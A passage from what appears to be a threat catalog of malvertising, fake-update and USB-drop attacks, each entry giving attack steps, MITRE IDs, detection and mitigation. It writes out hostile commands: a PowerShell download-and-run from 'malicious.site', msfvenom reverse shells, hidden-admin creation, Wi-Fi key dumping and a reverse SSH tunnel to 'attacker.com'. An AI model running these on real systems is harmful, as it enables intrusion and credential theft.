- **Attack Steps**: 1. Attacker buys ad space on lesser-known but legitimate ad platforms with less vetting.2. Crafts an animated HTML5 banner embedding obfuscated shellcode exploiting a browser memory bug (e.g., use-after-free).3. When the banner is clicked, the exploit bypasses browser sandbox via heap spraying and ROP chains.4. Shellcode executes in memory, triggering command injection or DLL sideload.5. Malware is written using blob:, iframe sandbox, or hidden download API methods.6. Persistence established using scheduled tasks or registry keys.7. Since the exploit uses a zero-day, AV and EDR may not detect the intrusion.8. Attackers use click and geolocation filtering to avoid honeypots or researchers.
- **Detection**: JS heap usage analysis, ad click behavior logs
- **Solution**: Disable 3rd-party ad scripts, JS execution control
- **Tags**: #ZeroDayExploit #BrowserAttack #AdClickHack #ExploitChain #MITRE_T1203

## Ad-Based iFrame Redirect to Exploit Kit

- **Attack Type**: Drive-by via Malvertising
- **Target**: Web Visitors
- **Vulnerability**: Malicious iframe embedded in 3rd-party ads
- **MITRE**: T1189 – Drive-by via iFrame Exploit
- **Impact**: Remote code execution, RAT installation
- **Tools**: RIG EK, JS Fingerprinting, iframe exploit
- **Scenario**: A fake banner ad injects an iframe pointing to RIG EK that silently drops malware.
- **Attack Steps**: 1. Attacker hosts RIG Exploit Kit on a VPS and prepares multiple payloads (RATs, keyloggers).2. Submits a seemingly clean banner ad to an ad exchange with hidden iframe embedding.3. When the ad loads on popular websites, the iframe loads in background invisibly.4. iFrame connects to exploit kit landing page, which fingerprints browser (Flash, JS, OS).5. EK selects matching exploit and triggers it (e.g., Flash vuln, JS RCE).6. Once exploit is successful, it downloads malware silently using browser blob techniques or background fetch.7. Infected systems join botnet or leak credentials via keyloggers.8. Campaign often rotates IPs and payloads to remain undetected.
- **Detection**: iframe domain tracking, behavior-based heuristics
- **Solution**: Disable 3rd-party iframes, sandbox ad content
- **Tags**: #Malvertising #ExploitKit #iFrameAttack #AdAbuse #MITRE_T1189

## Fake Software Update Pop-Up

- **Attack Type**: Pop-Up Exploit
- **Target**: Browser Users
- **Vulnerability**: UI spoofing, no download restrictions
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Initial access, backdoor control
- **Tools**: Empire, JS, FakeAlertGen
- **Scenario**: Fake browser update pop-up tricks users into downloading a trojan when they think they are updating Chrome or Flash.
- **Attack Steps**: 1. The attacker compromises a legitimate website or sets up a cloned version of a trusted site that users frequently visit (e.g., streaming or tech news). 2. They inject JavaScript that displays a modal dialog styled exactly like a Chrome, Firefox, or Flash update notice using mimicked branding, UI elements, and logos. 3. The fake update modal includes a “Download” button that points to a malicious executable (e.g., UpdateInstaller.exe) hosted on a C2-controlled infrastructure. 4. When a victim clicks the button, the file downloads with misleading metadata (e.g., showing “Google Update” as the publisher). 5. The attacker relies on social engineering to trick the victim into granting administrator privileges to install it. 6. Upon execution, the file deploys an Empire agent that initiates a reverse shell connection to the attacker. 7. The attacker now has remote access, persistence, and can use lateral movement inside the environment.
- **Detection**: EDR pop-up detection, hash-based filtering
- **Solution**: Disable pop-ups, educate users, enforce auto-update
- **Tags**: #DriveBy #FakeUpdate #Trojan #Empire #RedTeam #MITRE_T1189

## Watering Hole Attack on Industry Website

- **Attack Type**: Watering Hole + Targeted Delivery
- **Target**: Industry Employees
- **Vulnerability**: Poor web app code integrity
- **MITRE**: T1189 – Drive-by, T1071 – C2 Comm
- **Impact**: Targeted compromise, lateral movement
- **Tools**: Cobalt Strike, JS Payload Loader
- **Scenario**: A legitimate industry portal is compromised to deliver malware only to specific users (e.g., based on IP/geolocation).
- **Attack Steps**: 1. The attacker conducts recon to identify high-traffic websites trusted by specific industry targets (e.g., aerospace or energy sector news/blogs). 2. They exploit vulnerabilities in the CMS backend or reuse leaked admin credentials to gain access to the site. 3. Malicious JavaScript is injected into key templates or headers. 4. The script performs IP-based filtering by checking the visitor’s geolocation or ASN to match known ranges of the target company. 5. If matched, the script redirects the victim to a malicious page hosting a Cobalt Strike payload (e.g., hosted via Amazon S3 or Ngrok tunnel). 6. The downloaded loader may exploit browser or plugin vulnerabilities to auto-execute and install a beacon. 7. Victims not matching the IP profile are served the normal site to avoid detection by security researchers or crawlers.
- **Detection**: IDS/IPS anomaly detection, DNS & redirect logs
- **Solution**: Secure admin access, restrict JS injection
- **Tags**: #WateringHole #DriveBy #TargetedAttack #CobaltStrike #MITRE_T1189 #MITRE_T1071

## WordPress Plugin Infection Delivers Auto Malware

- **Attack Type**: CMS Plugin Abuse
- **Target**: Website Visitors
- **Vulnerability**: Plugin validation failure
- **MITRE**: T1190 – Exploit Public App
- **Impact**: Persistent malware infection
- **Tools**: WordPress, JS, Meterpreter Payload
- **Scenario**: Malicious WordPress plugin is used to inject scripts that download and execute malware when the site loads.
- **Attack Steps**: 1. Attacker creates a legitimate-looking WordPress plugin with embedded obfuscated JavaScript hidden in non-critical files. 2. Either uploads it to the official plugin repository or uses credential stuffing to compromise an existing admin dashboard and upload it directly. 3. Once activated, the plugin injects a <script> tag in the site’s header/footer pointing to an external malware host. 4. Visitors unknowingly download a payload file disguised as a legitimate resource (e.g., a favicon or doc preview). 5. MIME spoofing is used to name the executable as .png or .docx while retaining .exe functionality. 6. Auto-downloads are often executed by OS-default file handlers if the file type is associated (e.g., “open .docx with Word”). 7. Executed malware runs Meterpreter or other RAT tools, establishing C2 communication and backdoor access.
- **Detection**: Plugin file hash monitoring, inline JS behavior scan
- **Solution**: Plugin audit, restrict upload rights
- **Tags**: #WordPress #DriveBy #PluginMalware #CMSExploit #MITRE_T1190

## Fake Video Site Triggers Background Downloader

- **Attack Type**: Clone-Based JS Downloader
- **Target**: Home Users
- **Vulnerability**: Clone UI deception, ZIP abuse
- **MITRE**: T1204.002 – User Execution (ZIP)
- **Impact**: Social engineering-based execution
- **Tools**: JS, HTML5 Downloader, ZIPPayload
- **Scenario**: A fake YouTube-like page tricks user to play a video; instead, clicking triggers background malware download.
- **Attack Steps**: 1. Attacker clones the YouTube user interface using available HTML/CSS templates from open-source repositories. 2. Replaces the embedded video player with a static image (e.g., GIF) to simulate a buffering video. 3. Clicking on the “Play” button runs an onclick event triggering a silent background download using Blob() or <a download> method. 4. A ZIP file is downloaded named as “video_player.zip” containing an EXE payload (e.g., player.exe). 5. The ZIP may also contain a .vbs or .bat launcher script for improved compatibility. 6. Victim unzips and runs the file believing it’s a video codec or required player. 7. Executed payload establishes remote access or begins keylogging/data theft.
- **Detection**: ZIP payload inspection, unusual file type detection
- **Solution**: Block fake clone domains, alert on executable in ZIP
- **Tags**: #DriveBy #YouTubeClone #ZIPMalware #DownloaderExploit #MITRE_T1204_002

## Auto-Executing Payload via HID Emulation

- **Attack Type**: HID-based Command Execution
- **Target**: General Employees
- **Vulnerability**: Curiosity, HID spoofing
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Remote access, stealth shell execution
- **Tools**: Rubber Ducky, Cobalt Strike
- **Scenario**: USB device emulates a keyboard, auto-types PowerShell payload on plug-in to gain remote shell.
- **Attack Steps**: 1. The attacker programs a Rubber Ducky or similar HID attack device to simulate keyboard strokes upon being plugged into a system. 2. Script includes keystrokes to open PowerShell and execute a command such as: powershell -windowstyle hidden -command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')" to fetch and run the malware. 3. The attacker physically plants the USB device in a public or semi-private location (parking lot, cafeteria, conference room). 4. An employee finds the USB and plugs it in, thinking it's lost property. 5. Device types payload instantly without requiring autorun, exploiting trust in human interaction. 6. Reverse shell is opened, and the attacker receives persistent access through beaconing or RAT payload. 7. The malware may establish persistence via registry keys, scheduled tasks, or file drops.
- **Detection**: USB port monitoring, PowerShell logging
- **Solution**: Disable USB ports, restrict HID devices
- **Tags**: #RedTeam #USBExploit #RubberDucky #HIDAttack #MITRE_T1200

## Weaponized DOCX on USB Drive

- **Attack Type**: Social Engineering + Macro Exploit
- **Target**: Office Staff
- **Vulnerability**: Curiosity-driven USB access and macro execution
- **MITRE**: T1204.002
- **Impact**: Initial foothold, remote access
- **Tools**: Word Macro, msfvenom, Empire
- **Scenario**: USB contains an “HR_Policy.docx” with embedded macro that executes payload when opened.
- **Attack Steps**: 1. Generate a malicious payload using msfvenom that initiates a reverse shell (e.g., msfvenom -p windows/meterpreter/reverse_tcp).2. Embed the payload in a Microsoft Word macro using Visual Basic for Applications (VBA). This macro is designed to auto-execute on document open and run PowerShell to spawn the payload.3. Save the document as HR_Policy.docx and label the USB device attractively with terms like “HR Confidential” or “Q1 Salary Structure”.4. Drop the USB drive strategically near HR departments, break rooms, or common areas where staff are likely to pick it up.5. When an employee opens the document, the macro triggers, bypasses basic macro warnings (e.g., using AutoOpen or Document_Open functions), and connects to the attacker's Empire C2 server.6. To reduce suspicion, the macro also opens a benign-looking document page that appears to be legitimate HR content.
- **Detection**: Macro audit logs, C2 beacon detection
- **Solution**: Block USB ports, disable macros, educate users
- **Tags**: #USBDrop #MacroMalware #OfficeExploit #RedTeam #MITRE_T1204_002

## LNK File Shortcut Attack

- **Attack Type**: LNK File Execution Exploit
- **Target**: Finance Staff
- **Vulnerability**: Windows file extension hiding and .lnk abuse
- **MITRE**: T1204.002
- **Impact**: Remote access, stealth persistence
- **Tools**: LNK Creator, Obfuscated Shellcode, PowerShell
- **Scenario**: USB includes fake document shortcut that actually runs malware via cmd.exe.
- **Attack Steps**: 1. Create a Windows shortcut file (.lnk) with an innocuous name like “Q3_Financial_Report.lnk”.2. Instead of linking to a real document, configure the shortcut to execute cmd.exe /c powershell -nop -w hidden -enc <base64-payload>, launching a hidden reverse shell.3. Use a familiar document icon for the shortcut to increase believability and hide file extensions to obscure the .lnk.4. Include a decoy PDF or DOCX in the USB drive to provide cover if the user becomes suspicious.5. Drop USBs in high-value target areas like finance offices or board rooms.6. Once plugged in and the shortcut clicked, the payload is executed, creating a foothold and establishing persistence using registry run keys or scheduled tasks.
- **Detection**: File execution logs, PowerShell monitoring
- **Solution**: Force file extension visibility, block .lnk from USB
- **Tags**: #USBExploit #LNKAttack #PowerShellMalware #RedTeam #MITRE_T1204_002

## EXE Disguised as PDF in USB Drop

- **Attack Type**: File Renaming Deception
- **Target**: Accounting Staff
- **Vulnerability**: Windows hides known file extensions by default
- **MITRE**: T1204.002
- **Impact**: Persistent malware install
- **Tools**: UPX Packer, Payload Binder
- **Scenario**: Attacker drops USB with “Invoice.pdf.exe” file designed to trick users into thinking it's a document.
- **Attack Steps**: 1. Use a binder tool to combine a real PDF document with a malicious EXE payload (e.g., ransomware, RAT).2. Name the file misleadingly like “Invoice.pdf.exe” and assign it a legitimate PDF icon.3. Utilize tools like UPX to compress and obfuscate the EXE to evade AV signatures.4. Drop the USB in busy office locations such as reception areas or cafeteria tables.5. On opening, the victim unknowingly executes the malware while the decoy PDF opens to distract them.6. Malware executes, gains persistence via registry or task scheduler, and initiates data exfiltration or system compromise.
- **Detection**: USB EXE logging, abnormal process tracking
- **Solution**: Show extensions, block executable autorun from USB
- **Tags**: #PDFExploit #USBBackdoor #EXEDisguise #RedTeam #MITRE_T1204_002

## Autorun.inf Exploit on Legacy Windows

- **Attack Type**: Legacy Autorun Abuse
- **Target**: Legacy Systems
- **Vulnerability**: Deprecated autorun still enabled
- **MITRE**: T1200
- **Impact**: Code execution without user interaction
- **Tools**: Meterpreter, autorun.inf, FAT32 USB Formatter
- **Scenario**: Targets outdated Windows systems where autorun.inf is still active to launch payload automatically.
- **Attack Steps**: 1. Use msfvenom to generate a Meterpreter reverse TCP payload (e.g., msfvenom -p windows/meterpreter/reverse_tcp), saving it as malware.exe.2. Create an autorun.inf file that instructs the system to automatically run malware.exe upon USB insertion.3. Format a USB drive in FAT32 and place both autorun.inf and the executable in the root directory.4. Distribute the USB near buildings, parking lots, or public seating areas.5. When inserted into a legacy Windows system (e.g., Windows 7, XP), the autorun.inf executes silently and connects to the attacker.6. Meterpreter session opens with full control of the victim machine, enabling privilege escalation or lateral movement.
- **Detection**: Legacy software inventory, autorun detection
- **Solution**: Disable autorun, remove legacy systems
- **Tags**: #USBDrop #AutorunExploit #LegacyAbuse #RedTeam #MITRE_T1200

## USB Rubber Ducky Exfiltrates Browser Passwords

- **Attack Type**: Credential Harvesting via HID
- **Target**: Office Employee
- **Vulnerability**: Browser password storage, USB keyboard spoofing
- **MITRE**: T1200
- **Impact**: Credential theft, silent exfiltration
- **Tools**: Rubber Ducky, PowerShell, Nirsoft Tools
- **Scenario**: USB emulates a keyboard and executes commands to extract and exfiltrate saved passwords from browsers.
- **Attack Steps**: 1. Use Rubber Ducky to craft a script that types and runs a hidden PowerShell command upon plug-in.2. The script launches Nirsoft tools like WebBrowserPassView to extract saved browser passwords silently.3. The data is encoded (e.g., base64) and either emailed to an attacker-controlled address or posted to a remote HTTP endpoint.4. Drop or gift the USB in public areas like event booths or office waiting lounges, labeling it attractively (e.g., “Event Photos”).5. When plugged into a system, the Rubber Ducky acts as a keyboard and types the exfiltration script without user consent.6. All actions are performed in the background, with no visible window shown to the user.
- **Detection**: HID device behavior tracking, tool fingerprinting
- **Solution**: Block unauthorized HID USBs, disable browser password storage
- **Tags**: #RubberDucky #PasswordTheft #USBHack #MITRE_T1200 #BrowserCredentialExfil

## USB Launches Ransomware with Decoy PDF

- **Attack Type**: Ransomware Trigger via User Action
- **Target**: General Users
- **Vulnerability**: Curiosity, multi-payload trickery
- **MITRE**: T1486
- **Impact**: Data encryption and ransom demand
- **Tools**: PDF decoy, RansomEXX, Task Scheduler
- **Scenario**: USB carries a decoy PDF and ransomware file; user opens decoy while malware executes in background.
- **Attack Steps**: 1. Create a dropper executable that contains both a decoy PDF and a ransomware binary (e.g., RansomEXX).2. On execution, the dropper opens the PDF using the system's default viewer to mask malicious activity.3. Simultaneously, the ransomware installs in the background, creates persistence via task scheduler or registry keys.4. A delay (e.g., 10 minutes) is implemented before file encryption starts to avoid immediate detection.5. USB labeled with high-interest topics such as “Company_Meeting_Notes” is dropped in target zones.6. Upon user interaction, ransomware encrypts files and drops ransom notes on the desktop.
- **Detection**: Encryption pattern monitoring, file rename tracking
- **Solution**: Educate staff, disable autorun, deploy ransomware detection
- **Tags**: #RansomwareUSB #DecoyPDF #DropperPayload #MITRE_T1486

## USB with Preloaded Wi-Fi Harvester Script

- **Attack Type**: Wi-Fi Info Collection
- **Target**: IT/Admin Staff
- **Vulnerability**: Windows plaintext storage of Wi-Fi keys
- **MITRE**: T1552.001
- **Impact**: Internal Wi-Fi compromise
- **Tools**: Bash Bunny, PowerShell, Netsh, Wi-Fi Viewer
- **Scenario**: Script runs upon USB plug-in to harvest Wi-Fi credentials (saved SSIDs and passwords) from the host system.
- **Attack Steps**: 1. Prepare a Bash Bunny payload that triggers as a HID + mass storage combo.2. Upon plug-in, the script silently opens PowerShell and executes the command netsh wlan export profile key=clear, which dumps all stored Wi-Fi credentials in plaintext XML files.3. The files are collected and optionally uploaded via HTTP POST to a remote server or stored locally for later retrieval.4. USB labeled as “Conference_Photos_2025” is dropped near meeting rooms or IT desks.5. If inserted, no popups or visible windows alert the user to the operation.6. Useful for reconnaissance or setting up follow-up lateral movement via compromised internal Wi-Fi.
- **Detection**: netsh command tracking, credential dump detection
- **Solution**: Encrypt Wi-Fi configs, restrict USB usage
- **Tags**: #WiFiCredHarvest #USBDrop #BashBunny #MITRE_T1552_001

## USB Creates Hidden Admin User

- **Attack Type**: Privilege Escalation
- **Target**: Local User
- **Vulnerability**: User must have admin session or auto-elevation
- **MITRE**: T1136.001 – Create Account
- **Impact**: Hidden persistence, lateral access
- **Tools**: Rubber Ducky, PowerShell, Net User
- **Scenario**: On plug-in, USB auto-types command to create a hidden local administrator account for persistent access.
- **Attack Steps**: 1. Attacker programs a Rubber Ducky USB with a script that emulates HID keystrokes to execute system commands.2. Upon plug-in, the USB quickly opens a command prompt or PowerShell window without user interaction.3. It runs a command like net user hiddenadmin Pass123 /add followed by net localgroup administrators hiddenadmin /add, silently creating a new hidden admin user.4. Registry commands are optionally executed to hide the user from the login screen (reg add for Winlogon\SpecialAccounts\UserList).5. This user persists for future RDP or lateral movement access.6. Attack completes in seconds and leaves minimal visible trace unless system logs are audited.
- **Detection**: Account creation logs, registry change monitors
- **Solution**: Monitor for unauthorized net user commands
- **Tags**: #HiddenAccount #AdminEscalation #USBExploit #MITRE_T1136_001

## Bash Bunny Attacks Air-Gapped System

- **Attack Type**: Air-Gap Compromise
- **Target**: Air-Gapped Device
- **Vulnerability**: Physical access, no USB restriction
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Sensitive offline data breach
- **Tools**: Bash Bunny, PowerShell, Data Dumper
- **Scenario**: USB executes payload to collect system info and stage data exfiltration from air-gapped machines.
- **Attack Steps**: 1. Bash Bunny is configured with a payload that automatically launches upon insertion into a system.2. The script silently gathers system details like hostname, IP configuration, user accounts, and OS version.3. It recursively searches for key file types (DOCX, XLSX, PDFs) in common directories (Desktop, Documents).4. Collected data is zipped and written directly to the USB, requiring no internet.5. The attacker later retrieves the USB for offline access or optionally includes a low-power beacon to signal pickup.6. Especially devastating when used inside defense, R&D, or classified air-gapped environments.
- **Detection**: File activity logs, USB enumeration tracking
- **Solution**: Prohibit USB access in high-security environments
- **Tags**: #AirGapBypass #DataTheft #BashBunny #RedTeam #MITRE_T1200

## USB Installs Keylogger in Stealth

- **Attack Type**: Keylogging + Persistence
- **Target**: General Users
- **Vulnerability**: USB allowed, no behavioral monitoring
- **MITRE**: T1056.001 – Input Capture
- **Impact**: Credential theft, session hijacking
- **Tools**: Keylogger EXE, Obfuscator, Registry Tool
- **Scenario**: USB drops and installs keylogger that silently records keystrokes and stores or exfiltrates them.
- **Attack Steps**: 1. Attacker prepares an obfuscated keylogger executable that bypasses antivirus signature detection.2. USB is programmed to drop the executable silently using a dropper script or social engineering bait (e.g., fake resume or media file).3. Upon execution, the keylogger installs itself and establishes persistence via registry entries (e.g., HKCU\Software\Microsoft\Windows\CurrentVersion\Run).4. It starts capturing keystrokes, credentials, emails, and documents silently in the background.5. Logs are either stored locally on disk or periodically sent via email or uploaded once USB is plugged again.6. Attack remains active indefinitely until discovered or AV detects anomaly behavior.
- **Detection**: Unusual registry persistence, outbound traffic
- **Solution**: Restrict USB usage and audit autorun behaviors
- **Tags**: #KeyloggerUSB #CredentialTheft #USBSpyware #RedTeam #MITRE_T1056_001

## USB Exploits AutoPlay via Hidden Executable

- **Attack Type**: AutoPlay-Based Execution
- **Target**: Office Users
- **Vulnerability**: AutoPlay enabled, icon spoofing trusted
- **MITRE**: T1204.002 – User Execution
- **Impact**: Malware drop, remote control
- **Tools**: Malicious EXE, Icon Changer, AutoPlay
- **Scenario**: USB uses disguised file and AutoPlay trick to run payload upon user double-click in File Explorer.
- **Attack Steps**: 1. Attacker creates a malicious executable (e.g., RAT or keylogger) and changes its icon to resemble a PDF or DOC using tools like Resource Hacker.2. The file is named something like Resume.pdf and placed in the USB root folder.3. AutoPlay is triggered when the USB is inserted, showing the disguised file.4. The user, believing it to be a normal document, double-clicks it.5. Windows launches the executable, which installs the attacker’s payload with full functionality.6. Malware executes, possibly establishing a C2 beacon, keylogging, or stealing browser sessions.
- **Detection**: USB AutoPlay logs, user EXE launch events
- **Solution**: Disable AutoPlay and show known file extensions
- **Tags**: #AutoPlayExploit #DisguisedEXE #MITRE_T1204_002 #USBHack

## USB Drop with Auto-Wi-Fi Connect Backdoor

- **Attack Type**: Rogue Wi-Fi Activation
- **Target**: Restricted Systems
- **Vulnerability**: Wi-Fi adapter exists, rogue hotspot nearby
- **MITRE**: T1105 – Ingress Tool Transfer
- **Impact**: Firewall bypass, hidden remote access
- **Tools**: Bash Bunny, WiFi Script, Hotspot
- **Scenario**: USB auto-executes script to connect to rogue Wi-Fi hotspot, enabling remote access in air-gapped systems.
- **Attack Steps**: 1. The USB contains a script that enables a disabled Wi-Fi adapter using system commands.2. The script initiates a scan for a pre-configured rogue SSID like "CorpBackup".3. If detected, the system automatically connects using stored credentials.4. Upon connection, a secondary payload retrieves a RAT or remote access script from the attacker’s mobile hotspot.5. Persistent connection may be enabled via task scheduler or registry for future exploitation.6. This covert tunnel allows external communication from a system assumed to be offline.
- **Detection**: Wi-Fi connection logs, suspicious SSIDs
- **Solution**: Disable Wi-Fi in classified or critical systems
- **Tags**: #WiFiBackdoor #AirGapBypass #USBDelivery #MITRE_T1105

## USB-Based Firmware Update Hijack

- **Attack Type**: Firmware-Level Exploitation
- **Target**: IT Technicians
- **Vulnerability**: Firmware update trusted, user cooperation
- **MITRE**: T1542.003 – Bootkit
- **Impact**: Root-level persistence
- **Tools**: Rogue Firmware, Flash Tool, USB Spoof
- **Scenario**: USB appears as firmware update tool (e.g., for BIOS or printer), but actually flashes infected firmware.
- **Attack Steps**: 1. Attacker clones a legitimate vendor firmware tool interface and modifies the firmware binary to include a bootkit or pre-OS rootkit.2. The malicious firmware and update tool are bundled and stored on a USB with detailed instructions to trick IT staff.3. Employee initiates what appears to be a routine BIOS or printer firmware upgrade.4. The system flashes successfully, showing no error, but the attacker’s code is embedded at firmware level.5. This code allows remote control or bypass of OS-level defenses.6. Attack is persistent across reboots, OS reinstalls, and is invisible to typical endpoint detection.
- **Detection**: Firmware integrity tools, vendor hash validation
- **Solution**: Use signed firmware only, control firmware sources
- **Tags**: #FirmwareBackdoor #BIOSExploit #USBUpdateHack #MITRE_T1542_003

## USB Emulates Network Interface to Intercept DNS Traffic

- **Attack Type**: USB-to-Network Attack
- **Target**: Corporate PCs, Laptops
- **Vulnerability**: Trust of plug-and-play interfaces; no endpoint protection enforcing interface validation
- **MITRE**: T1200 – Hardware Additions
- **Impact**: DNS Hijack, session token theft, phishing redirection
- **Tools**: USB Armory, RNDIS, Custom DNS Spoofer
- **Scenario**: The USB device masquerades as a legitimate Ethernet adapter and manipulates DNS resolution to redirect the user to phishing domains.
- **Attack Steps**: 1. The attacker programs the USB using RNDIS to emulate a USB-to-Ethernet device.2. Upon plugging into the target machine, the OS (Windows/macOS) accepts the device as a new network interface without prompting the user.3. The USB interface is assigned higher priority than Wi-Fi or LAN in the routing table.4. It acts as a DNS proxy, spoofing resolution of specific domains (e.g., bank.com resolves to attacker's clone site).5. All HTTP/S traffic is either MITM'd or logged locally for exfiltration.6. Attacker may serve fake certificates or inject JavaScript for session theft.7. On older systems, the attack proceeds even if the screen is locked, making it a stealth post-exploitation vector.
- **Detection**: Routing table anomalies, DNS resolution discrepancies
- **Solution**: Block USB NIC enumeration, enforce device authentication for new interfaces
- **Tags**: #DNSPoisoning #USBNetwork #RNDISAbuse #MITRE_T1200

## USB Auto-Mounts Reverse SSH Server on Embedded Linux

- **Attack Type**: Linux Reverse Tunnel Setup
- **Target**: Embedded Linux, Raspberry Pi, IoT Device
- **Vulnerability**: USB access enabled, no binary execution policy
- **MITRE**: T1573 – Encrypted Channel
- **Impact**: Covert remote access in air-gapped Linux environments
- **Tools**: Dropbear SSH, init.d script, autossh
- **Scenario**: A USB contains an executable that when run on embedded Linux devices (e.g., kiosks, ATMs), silently initiates a reverse SSH connection back to attacker.
- **Attack Steps**: 1. USB contains embedded Linux-compatible binaries including dropbear (lightweight SSH) and a wrapper script.2. Upon mounting, the user runs a disguised binary (e.g., “update-tool”) which installs the binaries.3. Script creates an init.d service or modifies /etc/rc.local for persistence.4. Uses autossh or nohup to establish a long-lived reverse tunnel to attacker’s IP.5. Traffic is encrypted and tunneled over port 443 to avoid detection.6. Attacker now has terminal access to an internal host that was previously unreachable.7. System appears unaffected; all operations continue as normal.
- **Detection**: Outbound SSH session to unknown host, new init.d entries
- **Solution**: Restrict script execution from USB, monitor reverse shell behavior
- **Tags**: #LinuxTunnel #USBExploit #IoTCompromise #MITRE_T1573

## USB Deploys Stealth Screen Grabber with Cloud Upload

- **Attack Type**: Screen Capture Spyware
- **Target**: Office Desktops, Developer Machines
- **Vulnerability**: Python runtime present or statically bundled executable
- **MITRE**: T1113 – Screen Capture
- **Impact**: Continuous surveillance of target activities, credential and code theft
- **Tools**: PyInstaller, pyautogui, Google Drive API
- **Scenario**: Attacker uses a USB drive to deploy a Python-based screen capture tool that uploads screenshots to attacker-controlled cloud storage.
- **Attack Steps**: 1. USB carries a disguised executable (“ReadMeViewer.exe”) generated with PyInstaller.2. Upon execution, it silently installs a Python-based background tool using persistence mechanisms like Task Scheduler or registry key Run.3. Every 20–30 seconds, it uses pyautogui.screenshot() to take full-screen images.4. Images are either zipped and stored locally or directly uploaded to a hidden folder on Google Drive using OAuth API.5. The folder syncs automatically; attacker monitors it remotely.6. Script avoids capturing screens with known antivirus windows to reduce suspicion.7. Tool runs silently and survives reboots.
- **Detection**: High frequency of screen capture APIs, unusual file transfer activity
- **Solution**: Block Python executables, monitor for abnormal GUI API use
- **Tags**: #ScreenLogger #CloudExfiltration #USBSpy #MITRE_T1113

## USB Enables RDP Access with Localadmin + Firewall Rules

- **Attack Type**: RDP Backdoor Deployment
- **Target**: Windows Admin Devices
- **Vulnerability**: No USB HID restrictions, firewall open to config changes
- **MITRE**: T1021.001 – Remote Services (RDP)
- **Impact**: Silent RDP backdoor with admin control
- **Tools**: Rubber Ducky, PowerShell, Registry, Netsh
- **Scenario**: USB uses a keystroke injection script to enable RDP, open firewall ports, and create a hidden admin account for future access.
- **Attack Steps**: 1. The USB acts as a keyboard HID and injects pre-programmed keystrokes once plugged in.2. PowerShell commands are typed invisibly to enable RDP: Set-ItemProperty -Path ... fDenyTSConnections 0.3. Firewall rules are adjusted with netsh advfirewall firewall add rule ... to allow inbound 3389.4. A new local admin user net user stealthadmin Pass!234 /add is created.5. Registry edited to hide this user from login screen.6. Attacker now connects remotely using RDP from outside.7. No visual prompts or UAC triggers are shown during attack.
- **Detection**: Sudden changes in RDP status, new users added silently
- **Solution**: Disable autorun HID, enforce firewall and RDP baselines
- **Tags**: #RDPExploit #Backdoor #SilentAccess #MITRE_T1021_001

## USB DLL Hijack with Signed App + Malicious Dependency

- **Attack Type**: DLL Search Order Hijacking
- **Target**: End-User Devices
- **Vulnerability**: User executes EXE from USB, DLL Safe Search disabled
- **MITRE**: T1574.001 – DLL Search Order Hijacking
- **Impact**: Execution of attacker code under the guise of legit app
- **Tools**: Signed EXE (legit), Malicious DLL, PEStudio
- **Scenario**: USB presents a legitimate signed application along with a malicious DLL, tricking OS into loading attacker code.
- **Attack Steps**: 1. The attacker downloads a portable legitimate app (e.g., “7zip.exe” or “vlc.exe”).2. A malicious DLL is created with the same name as a dependency the EXE searches for (e.g., “7z.dll” or “libvlc.dll”).3. On USB, both files are placed in the root directory.4. Victim executes the EXE from USB expecting legit behavior.5. OS loads the malicious DLL due to directory precedence rules.6. DLL spawns malware (e.g., C2 beacon, RAT, crypto miner) while legitimate app continues to function.7. Stealthy since no popups occur and user sees real app interface.
- **Detection**: Monitor DLL loads from external devices, app hash mismatches
- **Solution**: Enable Safe DLL Search Mode, disallow external EXEs
- **Tags**: #DLLInjection #SignedAppMisuse #MITRE_T1574_001 #RedTeam

## USB Emulates Ethernet Adapter to Bypass Controls

- **Attack Type**: USB Network Emulation Attack
- **Target**: Windows/MacOS
- **Vulnerability**: Auto-trust of new network interfaces
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Full HTTP hijack, credential harvesting
- **Tools**: PoisonTap, USB Armory, RNDIS
- **Scenario**: USB device masquerades as a network adapter to intercept and redirect traffic.
- **Attack Steps**: 1. The attacker configures a USB device (e.g., Raspberry Pi Zero or USB Armory) to act as an RNDIS (Remote Network Driver Interface Specification) Ethernet gadget. 2. Upon connecting to a system, the operating system auto-recognizes it as a trusted network adapter due to default trust of Ethernet interfaces. 3. The fake adapter is assigned a higher network priority, allowing it to intercept HTTP traffic. 4. The device injects JavaScript payloads into HTML responses (via DNS spoofing or packet injection). 5. Even with a locked screen, the system may allow limited HTTP calls (e.g., captive portal checks), which the attacker exploits to trigger code. 6. Optional modules redirect victims to malicious captive portals or hijack cookies/session tokens.
- **Detection**: Monitor new network adapters, inspect routing table changes
- **Solution**: Block USB network drivers, disable RNDIS by policy
- **Tags**: #PoisonTap #USBNetwork #MITRE_T1200 #EthernetSpoofing

## USB Plants Auto-Reverse SSH Tunnel on Linux Host

- **Attack Type**: Remote Tunnel Persistence via USB
- **Target**: Linux Systems
- **Vulnerability**: No USB script execution restriction
- **MITRE**: T1573 – Encrypted Channel
- **Impact**: Persistent shell, lateral access
- **Tools**: Bash Script, Cron, autossh
- **Scenario**: USB sets up a reverse SSH tunnel that enables remote attacker access.
- **Attack Steps**: 1. A USB drive contains a malicious Bash script with commands to establish a reverse SSH tunnel using autossh. 2. Upon insertion, if execution is triggered via autorun (or social engineering), the script executes silently. 3. The script installs autossh, sets up persistent connectivity to the attacker’s external server on a chosen port (e.g., ssh -R 2222:localhost:22 user@attacker.com). 4. For persistence, a cron job or systemd service is registered to launch at reboot. 5. Once completed, the attacker can SSH into their own server and tunnel directly into the internal Linux machine, bypassing firewalls. 6. The attack leaves minimal traces unless monitored for outbound SSH or abnormal cron entries.
- **Detection**: Monitor outbound reverse SSH connections, cron changes
- **Solution**: Block USB autorun, alert on unauthorized SSH tunnels
- **Tags**: #LinuxTunnel #autossh #MITRE_T1573 #USBPersistence

## USB Installs Background Screen Spy with Persistence

- **Attack Type**: Stealth Screenshot Malware
- **Target**: Workstations (All OS)
- **Vulnerability**: Lack of control over screen API
- **MITRE**: T1113 – Screen Capture
- **Impact**: Session monitoring, information leakage
- **Tools**: PyInstaller, Python, cron
- **Scenario**: USB triggers a hidden process that captures and exfiltrates screenshots.
